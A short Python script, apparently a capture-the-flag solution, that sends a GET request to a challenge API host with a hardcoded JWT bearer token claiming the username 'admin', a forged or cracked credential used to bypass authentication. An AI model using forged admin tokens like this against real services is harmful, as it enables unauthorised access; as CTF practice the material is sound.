#!/usr/bin/python3

import requests as r

header = {
    "Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMDQzMTk3fQ.it7Lbwt35DTecQd7DpZZKpk4qDomCBwoXSaZYtoHK-8Hp4X1PDv2CRVwFrLemhtDlf1t1v72ScEt0IaZdjEFKw"
}

req_get = r.get("http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080", headers= header)

print(req_get.text)
